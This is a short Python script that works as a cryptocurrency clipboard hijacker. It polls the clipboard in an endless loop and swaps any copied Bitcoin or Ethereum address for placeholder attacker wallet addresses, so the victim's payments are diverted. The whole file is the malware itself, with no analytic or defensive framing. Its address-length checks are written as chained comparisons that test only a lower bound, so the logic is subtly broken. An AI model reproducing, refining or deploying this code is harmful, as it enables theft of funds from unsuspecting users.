from time import sleep
import pyperclip as pc

btc_address = "BTC_HERE"
eth_address = "ETH_HERE"


while True:
    s = str(pc.paste())
    length_of_s = len(s)
    sleep(0.25)
    if s.startswith("1"):
        if length_of_s > 26 < 36:
            pc.copy(btc_address)
    elif s.startswith("bc1",0,3):
        if length_of_s > 26 < 36:
            pc.copy(btc_address)
    elif s.startswith("3"):
        if length_of_s > 26 < 36:
            pc.copy(btc_address)
    elif s.startswith("0x",0,2):
        if length_of_s > 20 < 40:
            pc.copy(eth_address)
